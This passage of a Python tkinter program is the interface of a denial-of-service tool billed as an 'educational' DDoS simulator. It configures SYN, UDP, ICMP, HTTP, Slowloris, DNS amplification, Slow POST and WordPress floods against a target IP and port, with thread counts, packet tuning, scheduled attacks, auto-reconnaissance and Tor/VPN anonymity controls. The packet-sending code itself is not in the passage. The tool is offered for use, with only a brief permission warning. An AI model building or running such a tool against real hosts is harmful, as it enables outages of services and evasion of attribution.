        messagebox.showerror("Error", "Select a valid profile!")
        return
    
    profile = user_profiles[profile_name]
    current_profile = profile_name
    
    ip_entry.delete(0, tk.END)
    ip_entry.insert(0, profile.get("ip", ""))
    
    port_entry.delete(0, tk.END)
    port_entry.insert(0, profile.get("port", ""))
    
    attack_type_var.set(profile.get("attack_type", "SYN"))
    
    thread_entry.delete(0, tk.END)
    thread_entry.insert(0, profile.get("threads", "5"))
    
    max_packet_entry.delete(0, tk.END)
    max_packet_entry.insert(0, profile.get("max_packets", "1000"))
    
    pcap_log_var.set(profile.get("pcap_log", False))
    
    cpu_limit_entry.delete(0, tk.END)
    cpu_limit_entry.insert(0, profile.get("cpu_limit", "80"))
    
    ram_limit_entry.delete(0, tk.END)
    ram_limit_entry.insert(0, profile.get("ram_limit", "80"))
    
    network_limit_entry.delete(0, tk.END)
    network_limit_entry.insert(0, profile.get("network_limit", "100"))
    
    delay_entry.delete(0, tk.END)
    delay_entry.insert(0, profile.get("delay", "0"))
    
    ttl_entry.delete(0, tk.END)
    ttl_entry.insert(0, profile.get("ttl", ""))
    
    window_entry.delete(0, tk.END)
    window_entry.insert(0, profile.get("window", ""))
    
    dry_run_var.set(profile.get("dry_run", False))
    auto_recon_var.set(profile.get("auto_recon", False))
    
    messagebox.showinfo("Success", f"Profile '{profile_name}' loaded!")

# Save profiles to file
def save_profiles_to_file():
    with open("attack_profiles.json", "w") as f:
        json.dump(user_profiles, f)

# Load profiles from file
def load_profiles_from_file():
    global user_profiles
    try:
        if os.path.exists("attack_profiles.json"):
            with open("attack_profiles.json", "r") as f:
                user_profiles = json.load(f)
    except:
        user_profiles = {}

# Verify captcha
def verify_captcha():
    captcha = generate_secure_captcha()
    user_input = simpledialog.askstring("Captcha Verification", 
                                        f"Please enter the following captcha:\n{captcha}")
    return user_input == captcha

# Toggle dark mode
def toggle_dark_mode():
    global dark_mode
    dark_mode = dark_mode_var.get()
    apply_theme()

# Apply theme
def apply_theme():
    bg_color = "#2E2E2E" if dark_mode else "#F0F0F0"
    fg_color = "#FFFFFF" if dark_mode else "#000000"
    entry_bg = "#3C3F41" if dark_mode else "#FFFFFF"
    
    style = ttk.Style()
    style.theme_use("default")
    
    style.configure(".", 
                   background=bg_color, 
                   foreground=fg_color,
                   font=("Arial", 10))
    
    style.configure("TFrame", background=bg_color)
    style.configure("TLabel", background=bg_color, foreground=fg_color)
    style.configure("TButton", background="#555555" if dark_mode else "#E0E0E0", 
                   foreground=fg_color, borderwidth=1)
    style.configure("TEntry", fieldbackground=entry_bg, foreground=fg_color)
    style.configure("TCombobox", fieldbackground=entry_bg, foreground=fg_color)
    
    root.config(bg=bg_color)
    for widget in root.winfo_children():
        apply_theme_to_widget(widget, bg_color, fg_color, entry_bg)

# Apply theme to widget
def apply_theme_to_widget(widget, bg, fg, entry_bg):
    widget_type = widget.winfo_class()
    
    if widget_type in ("TFrame", "TLabelFrame", "TLabelframe"):
        widget.config(background=bg)
    elif widget_type == "TLabel":
        widget.config(background=bg, foreground=fg)
    elif widget_type == "TButton":
        widget.config(style="TButton")
    elif widget_type in ("Text", "Listbox", "ScrolledText"):
        widget.config(bg=entry_bg, fg=fg, insertbackground=fg)
    elif widget_type == "Canvas":
        widget.config(bg=bg)
    
    for child in widget.winfo_children():
        apply_theme_to_widget(child, bg, fg, entry_bg)

# Keyboard shortcuts
def setup_keyboard_shortcuts():
    root.bind('<Control-s>', lambda e: start_attack())
    root.bind('<Control-q>', lambda e: stop_attack())
    root.bind('<Control-l>', lambda e: save_logs())
    root.bind('<Control-r>', lambda e: generate_pdf_report())
    root.bind('<Control-m>', lambda e: generate_ip_map())

# Create GUI
def create_gui():
    global ip_entry, port_entry, thread_entry, max_packet_entry, output_box
    global stats_label, root, attack_type_var, pcap_log_var, canvas, fig, ax1, ax2, ax3
    global profile_combobox, profile_name_entry, cpu_limit_entry, ram_limit_entry, network_limit_entry
    global top_ips_listbox, delay_entry, ttl_entry, window_entry, dry_run_var
    global schedule_entry, custom_payload_entry, custom_protocol_var, dark_mode_var, auto_recon_var
    
    root = tk.Tk()
    root.title("Advanced Pentest Tool - DDoS Simulator (Educational Use Only)")
    root.geometry("1300x1000")
    root.resizable(True, True)
    
    # Style configuration
    style = ttk.Style()
    style.theme_use("default")
    
    # Dark mode variable
    dark_mode_var = tk.BooleanVar(value=False)
    
    # Main frame
    main_frame = ttk.Frame(root, padding=10)
    main_frame.pack(fill=tk.BOTH, expand=True)
    
    # Notebook (tabs)
    notebook = ttk.Notebook(main_frame)
    notebook.pack(fill=tk.BOTH, expand=True, pady=5)
    
    # Attack tab
    attack_frame = ttk.Frame(notebook, padding=10)
    notebook.add(attack_frame, text="Attack Configuration")
    
    # Profile management
    profile_frame = ttk.LabelFrame(attack_frame, text="Attack Profiles", padding=10)
    profile_frame.pack(fill=tk.X, pady=(0, 10))
    
    ttk.Label(profile_frame, text="Profile Name:").grid(row=0, column=0, padx=5, pady=5)
    profile_name_entry = ttk.Entry(profile_frame, width=20)
    profile_name_entry.grid(row=0, column=1, padx=5, pady=5)
    
    save_profile_btn = ttk.Button(profile_frame, text="Save Profile", command=save_profile)
    save_profile_btn.grid(row=0, column=2, padx=5, pady=5)
    
    ttk.Label(profile_frame, text="Load Profile:").grid(row=0, column=3, padx=5, pady=5)
    profile_combobox = ttk.Combobox(profile_frame, values=list(user_profiles.keys()), width=20)
    profile_combobox.grid(row=0, column=4, padx=5, pady=5)
    
    load_profile_btn = ttk.Button(profile_frame, text="Load Profile", command=load_profile)
    load_profile_btn.grid(row=0, column=5, padx=5, pady=5)
    
    # Attack parameters
    input_frame = ttk.LabelFrame(attack_frame, text="Attack Parameters", padding=10)
    input_frame.pack(fill=tk.X, pady=(0, 10))
    
    # Attack type
    ttk.Label(input_frame, text="Attack Type:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
    attack_type_var = tk.StringVar(value="SYN")
    attack_combo = ttk.Combobox(input_frame, textvariable=attack_type_var, 
                               values=["SYN", "UDP", "ICMP", "HTTP", "Slowloris", "DNS", "Slow POST", "WordPress"], 
                               width=12, state="readonly")
    attack_combo.grid(row=0, column=1, padx=5, pady=5)
    
    # Target IP
    ttk.Label(input_frame, text="Target IP:").grid(row=0, column=2, sticky=tk.W, padx=5, pady=5)
    ip_entry = ttk.Entry(input_frame, width=20)
    ip_entry.grid(row=0, column=3, padx=5, pady=5)
    
    # Target port
    ttk.Label(input_frame, text="Target Port:").grid(row=0, column=4, sticky=tk.W, padx=5, pady=5)
    port_entry = ttk.Entry(input_frame, width=10)
    port_entry.grid(row=0, column=5, padx=5, pady=5)
    
    # Threads
    ttk.Label(input_frame, text="Threads:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
    thread_entry = ttk.Entry(input_frame, width=5)
    thread_entry.grid(row=1, column=1, padx=5, pady=5)
    thread_entry.insert(0, "5")
    
    # Max packets
    ttk.Label(input_frame, text="Max Packets:").grid(row=1, column=2, sticky=tk.W, padx=5, pady=5)
    max_packet_entry = ttk.Entry(input_frame, width=10)
    max_packet_entry.grid(row=1, column=3, padx=5, pady=5)
    max_packet_entry.insert(0, "1000")
    
    # Delay
    ttk.Label(input_frame, text="Delay (s):").grid(row=1, column=4, sticky=tk.W, padx=5, pady=5)
    delay_entry = ttk.Entry(input_frame, width=8)
    delay_entry.grid(row=1, column=5, padx=5, pady=5)
    delay_entry.insert(0, "0")
    
    # Advanced options
    advanced_frame = ttk.LabelFrame(attack_frame, text="Advanced Options", padding=10)
    advanced_frame.pack(fill=tk.X, pady=(0, 10))
    
    ttk.Label(advanced_frame, text="TTL:").grid(row=0, column=0, padx=5, pady=5)
    ttl_entry = ttk.Entry(advanced_frame, width=8)
    ttl_entry.grid(row=0, column=1, padx=5, pady=5)
    
    ttk.Label(advanced_frame, text="Window Size:").grid(row=0, column=2, padx=5, pady=5)
    window_entry = ttk.Entry(advanced_frame, width=8)
    window_entry.grid(row=0, column=3, padx=5, pady=5)
    
    # Auto-stop limits
    ttk.Label(advanced_frame, text="CPU Limit (%):").grid(row=0, column=4, padx=5, pady=5)
    cpu_limit_entry = ttk.Entry(advanced_frame, width=5)
    cpu_limit_entry.grid(row=0, column=5, padx=5, pady=5)
    cpu_limit_entry.insert(0, "80")
    
    ttk.Label(advanced_frame, text="RAM Limit (%):").grid(row=0, column=6, padx=5, pady=5)
    ram_limit_entry = ttk.Entry(advanced_frame, width=5)
    ram_limit_entry.grid(row=0, column=7, padx=5, pady=5)
    ram_limit_entry.insert(0, "80")
    
    ttk.Label(advanced_frame, text="Network Limit (MB):").grid(row=0, column=8, padx=5, pady=5)
    network_limit_entry = ttk.Entry(advanced_frame, width=5)
    network_limit_entry.grid(row=0, column=9, padx=5, pady=5)
    network_limit_entry.insert(0, "100")
    
    # Additional modes
    dry_run_var = tk.BooleanVar(value=False)
    dry_run_check = ttk.Checkbutton(advanced_frame, text="Dry Run (No packets sent)", 
                                   variable=dry_run_var)
    dry_run_check.grid(row=0, column=10, padx=5, pady=5)
    
    pcap_log_var = tk.BooleanVar(value=False)
    pcap_check = ttk.Checkbutton(advanced_frame, text="PCAP Logging", 
                                variable=pcap_log_var)
    pcap_check.grid(row=0, column=11, padx=5, pady=5)
    
    auto_recon_var = tk.BooleanVar(value=False)
    recon_check = ttk.Checkbutton(advanced_frame, text="Auto Reconnaissance", 
                                 variable=auto_recon_var)
    recon_check.grid(row=0, column=12, padx=5, pady=5)
    
    advanced_mode_var = tk.BooleanVar(value=False)
    advanced_check = ttk.Checkbutton(advanced_frame, text="Advanced Mode (Ethernet)", 
                                    variable=advanced_mode_var)
    advanced_check.grid(row=1, column=0, padx=5, pady=5, columnspan=2)
    
    # Schedule attack
    schedule_frame = ttk.LabelFrame(attack_frame, text="Schedule Attack", padding=10)
    schedule_frame.pack(fill=tk.X, pady=(0, 10))
    
    ttk.Label(schedule_frame, text="Time (HH:MM):").grid(row=0, column=0, padx=5, pady=5)
    schedule_entry = ttk.Entry(schedule_frame, width=8)
    schedule_entry.grid(row=0, column=1, padx=5, pady=5)
    
    schedule_btn = ttk.Button(schedule_frame, text="Schedule", command=schedule_attack)
    schedule_btn.grid(row=0, column=2, padx=5, pady=5)
    
    # VPN/Tor section
    vpn_frame = ttk.LabelFrame(attack_frame, text="Anonymity", padding=10)
    vpn_frame.pack(fill=tk.X, pady=(0, 10))
    
    tor_btn = ttk.Button(vpn_frame, text="Setup Tor", command=setup_tor_session)
    tor_btn.grid(row=0, column=0, padx=5, pady=5)
    
    renew_tor_btn = ttk.Button(vpn_frame, text="Renew Tor Identity", command=renew_tor_identity)
    renew_tor_btn.grid(row=0, column=1, padx=5, pady=5)
    
    vpn_btn = ttk.Button(vpn_frame, text="Connect VPN", command=lambda: connect_vpn("vpn_config.ovpn"))
    vpn_btn.grid(row=0, column=2, padx=5, pady=5)
    
    # Buttons
    btn_frame = ttk.Frame(attack_frame)
    btn_frame.pack(fill=tk.X, pady=5)
    
    start_btn = ttk.Button(btn_frame, text="Start Attack (Ctrl+S)", command=start_attack, style='Start.TButton')
    start_btn.pack(side=tk.LEFT, padx=5)
    
    stop_btn = ttk.Button(btn_frame, text="Stop Attack (Ctrl+Q)", command=stop_attack, style='Stop.TButton')
    stop_btn.pack(side=tk.LEFT, padx=5)
    
    clear_btn = ttk.Button(btn_frame, text="Clear Output", command=clear_output)
    clear_btn.pack(side=tk.LEFT, padx=5)
    
    save_logs_btn = ttk.Button(btn_frame, text="Save Logs (Ctrl+L)", command=save_logs)
    save_logs_btn.pack(side=tk.LEFT, padx=5)
    
    report_btn = ttk.Button(btn_frame, text="Generate Report (Ctrl+R)", command=generate_pdf_report)
    report_btn.pack(side=tk.LEFT, padx=5)
    
    map_btn = ttk.Button(btn_frame, text="Show IP Map (Ctrl+M)", command=generate_ip_map)
    map_btn.pack(side=tk.LEFT, padx=5)
    
    dark_mode_btn = ttk.Checkbutton(btn_frame, text="🌙 Dark Mode", 
                                  variable=dark_mode_var, command=toggle_dark_mode)
    dark_mode_btn.pack(side=tk.LEFT, padx=5)
    
    # Monitoring tab
    monitor_frame = ttk.Frame(notebook, padding=10)
    notebook.add(monitor_frame, text="Monitoring")
    
    # Stats label
    stats_frame = ttk.Frame(monitor_frame)
    stats_frame.pack(fill=tk.X, pady=5)
    
    stats_label = ttk.Label(stats_frame, text="📊 Start an attack to see statistics", 
                           font=("Arial", 10, "bold"), background="#e0e0e0")
    stats_label.pack(fill=tk.X, ipady=5)
    
    # Graph panel
    graph_frame = ttk.LabelFrame(monitor_frame, text="Real-time Monitoring", padding=10)
    graph_frame.pack(fill=tk.BOTH, expand=True, pady=10)
    
    # Create graphs
    fig, (ax1, ax2, ax3) = plt.subplots(3, 1, figsize=(10, 10))
    fig.tight_layout(pad=3.0)
    
    canvas = FigureCanvasTkAgg(fig, master=graph_frame)
    canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
    
    # Top IPs panel
    ips_frame = ttk.LabelFrame(monitor_frame, text="Top Source IPs", padding=10)
    ips_frame.pack(fill=tk.BOTH, pady=10)
    
    top_ips_listbox = tk.Listbox(ips_frame, height=5)
    top_ips_listbox.pack(fill=tk.BOTH, expand=True)
    
    # Output tab
    output_frame = ttk.Frame(notebook, padding=10)
    notebook.add(output_frame, text="Output")
    
    # Output area
    output_box = scrolledtext.ScrolledText(output_frame, height=20, wrap=tk.WORD)
    output_box.pack(fill=tk.BOTH, expand=True)
    output_box.insert(tk.END, "=== Advanced Penetration Testing Tool ===\n")
    output_box.insert(tk.END, "This tool is for educational and penetration testing purposes only\n\n")
    output_box.insert(tk.END, "Features:\n")
    output_box.insert(tk.END, "- Multiple attack vectors (SYN, UDP, ICMP, HTTP, DNS Amplification, etc.)\n")
    output_box.insert(tk.END, "- Real-time monitoring and statistics\n")
    output_box.insert(tk.END, "- Auto-reconnaissance and attack selection\n")
    output_box.insert(tk.END, "- VPN and Tor integration\n")
    output_box.insert(tk.END, "- PDF report generation\n")
    output_box.insert(tk.END, "="*80 + "\n")
    output_box.configure(state='disabled')
    
    # Warning
    warning_label = ttk.Label(main_frame, 
                             text="WARNING: Use this tool only on systems you own or have permission to test!",
                             foreground="red", 
                             font=("Arial", 9, "bold"),
                             anchor=tk.CENTER)
    warning_label.pack(side=tk.BOTTOM, fill=tk.X, pady=5)
    
    # Button styles
    style.configure('Start.TButton', background='#4CAF50', foreground='white')
    style.configure('Stop.TButton', background='#F44336', foreground='white')
    
    # Setup keyboard shortcuts
    setup_keyboard_shortcuts()
    
    return root

# Clear output
def clear_output():
    output_box.configure(state='normal')
    output_box.delete(1.0, tk.END)
    output_box.configure(state='disabled')
    log_and_display("Output cleared\n")

# On closing
def on_closing():
    global stop_flag
    stop_flag = True
    
    if pcap_writer:
        pcap_writer.close()
    
    time.sleep(1)
    root.destroy()

# Main function
def main():
    global root
    
    # Password verification
    if not verify_password():
        messagebox.showerror("Error", "Incorrect password! Exiting.")
        sys.exit()
    
    # Load GeoIP
    init_geoip()
    
    # Load profiles
    load_profiles_from_file()
    
    # Create GUI
    root = create_gui()
    
    # Set closing handler
    root.protocol("WM_DELETE_WINDOW", on_closing)
    
    # Scapy optimization
    conf.verb = 0
    
    # Start application
    root.mainloop()

if __name__ == "__main__":
    main()